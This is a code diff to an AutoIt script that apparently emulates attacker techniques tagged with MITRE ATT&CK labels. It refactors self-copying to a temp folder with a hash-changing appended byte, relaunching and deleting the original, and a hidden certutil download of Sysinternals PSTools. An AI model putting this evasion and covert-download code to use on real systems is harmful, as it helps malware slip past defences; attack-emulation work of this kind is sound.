@@ -10,6 +10,8 @@
 #include <AutoItConstants.au3>
 #include <Crypt.au3>
 
+Global $PSTools_URL = "https://download.sysinternals.com/files/PSTools.zip"
+
 $ErrorHandler = ObjEvent("AutoIt.Error", "ErrFunc") ; Custom error handler
 
 ;Error handler
@@ -163,29 +165,38 @@ Func RandomString();DESCRIPTION:random string generator;MITRE:-
    Return $out & ".exe"
 EndFunc
 
-Func CopyTempRun($newName = RandomString());DESCRIPTION:copy myself into temp changing hash;MITRE:Defence Evasion
-   FileCopy(@ScriptDir & "\" & @ScriptName, "C:\WINDOWS\TEMP\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
-   Local $hFileOpen = FileOpen("C:\WINDOWS\TEMP\" & $newName, $FO_APPEND)
+Func isRunningFromFolder($folder);DESCRIPTION:Check if sample is running from Specific Folder;MITRE:Discovery
+   if (StringUpper(@ScriptDir) == StringUpper($folder)) Then
+	  Return 1
+   EndIf
+EndFunc
+
+Func changeHASH($filePath)
+   Local $hFileOpen = FileOpen($filePath, $FO_APPEND)
    If $hFileOpen = -1 Then
 	  Return False
    EndIf
    FileWriteLine($hFileOpen, "1")
    FileClose($hFileOpen)
-   RunWait("C:\WINDOWS\TEMP\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
 EndFunc
 
-Func isRunningFromTemp();DESCRIPTION:Check if sample is running from Temp folder;MITRE:Discovery
-   if (StringUpper(@ScriptDir) & "\" & @ScriptName == "C:\WINDOWS\TEMP\" & @ScriptName) Then
+Func MoveAndRunAgain($folder = "C:\WINDOWS\TEMP", $newName = RandomString())
+   if isRunningFromFolder($folder) Then
 	  Return 1
+   Else
+	  FileCopy(@ScriptDir & "\" & @ScriptName, $folder & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
+	  changeHASH($folder & "\" & $newName)
+	  RunWait($folder & "\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
    EndIf
 EndFunc
 
-Func Move2Temp($newName = RandomString());DESCRIPTION:if it's not running from temp, drop child to temp with different hash;MITRE:Defence Evasion
-   if isRunningFromTemp() Then
+Func CopyAndRunAgain($folder = "C:\WINDOWS\TEMP", $newName = RandomString())
+   if isRunningFromFolder($folder) Then
 	  Return 1
    Else
-	  CopyTempRun($newName)
-	  Exit
+	  FileCopy(@ScriptDir & "\" & @ScriptName, $folder & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
+	  changeHASH($folder & "\" & $newName)
+	  RunWait($folder & "\" & $newName & " " & "keep_previous" & " " & @ScriptDir & "\" & @ScriptName);
    EndIf
 EndFunc
 
@@ -252,8 +263,10 @@ Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:dow
    InetGet($sURL, $FileName, 1, 1)
 EndFunc
 
-Func CertUtilDownloader($url, $fname) ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
-   RunWait("certutil.exe -urlcache -f " & $url & " C:\WINDOWS\TEMP\" & $fname,"" ,@SW_HIDE)
+Func CertUtilDownloader($url, $filePath = @TempDir & "\PSTools.zip") ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
+   If Not FileExists($filePath) Then
+	  RunWait("certutil.exe -urlcache -f " & $url & " " & $filePath,"" ,@SW_HIDE)
+   EndIf
 EndFunc
 
 Func PopUp();DESCRIPTION:PopUp using powershell;MITRE:-
@@ -354,12 +367,4 @@ EndFunc
 
 Func Unzip($source,$destination);DESCRIPTION:unzip;MITRE:-
    RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination, "", @SW_HIDE)
-EndFunc
-
-Func DownloadPSTools()
-   If Not FileExists(@TempDir & "\PSTools.zip") Then
-	  $PSTools_path = "https://download.sysinternals.com/files/PSTools.zip"
-	  HttpDownloadFile($PSTools_path, @TempDir & "\PSTools.zip")
-	  Unzip(@TempDir & "\PSTools.zip",@TempDir & "\")
-   EndIf
 EndFunc
